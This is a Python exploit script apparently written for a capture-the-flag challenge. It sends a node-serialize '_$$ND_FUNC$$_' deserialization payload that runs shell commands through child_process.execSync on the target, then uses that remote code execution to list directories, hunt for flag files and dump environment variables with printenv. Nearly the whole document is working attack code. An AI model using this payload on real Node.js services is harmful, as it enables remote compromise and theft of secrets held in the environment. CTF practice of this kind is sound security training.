#!/usr/bin/env python3
import requests
import json

TARGET = "http://obfusca-not-thor.hackday.fr:4224"

session = requests.Session()

def unlock():
    session.post(TARGET + '/vuqsqsddqsdln123', data={'data': 'ad1mi12n'})
    session.post(TARGET + '/vuqsqsqdsddqsdln1', data={'data': 'ba12'})

def rce(command):
    ns_payload = json.dumps({"rce": f"_$$ND_FUNC$$_function(){{return require('child_process').execSync('{command}').toString();}}()"})
    r = session.post(
        TARGET + '/vul18ddqsdln126',
        data={'data': ns_payload},
        headers={'Content-Type': 'application/x-www-form-urlencoded'}
    )
    try:
        result = r.json()
        return result.get('rce', r.text)
    except:
        return r.text

print("[*] Unlocking state machine...")
unlock()

print("[*] Running: ls /")
print(rce("ls /"))

print("[*] Running: find / -name 'flag*' -o -name '*.flag' 2>/dev/null")
unlock()
print(rce("find / -name flag* 2>/dev/null | head -20"))

print("[*] Running: cat /flag")
unlock()
print(rce("cat /flag 2>/dev/null || echo 'not found'"))

print("[*] Running: cat /flag.txt")
unlock()
print(rce("cat /flag.txt 2>/dev/null || echo 'not found'"))

print("[*] Running: env (check env vars for flag)")
unlock()
print(rce("env | grep -i flag 2>/dev/null || echo 'no flag in env'"))

print("[*] Running: ls /app/ or /srv/ etc")
unlock()
print(rce("ls /app 2>/dev/null || ls /srv 2>/dev/null || ls /home 2>/dev/null"))

print("[*] Running: printenv")
unlock()
print(rce("printenv"))
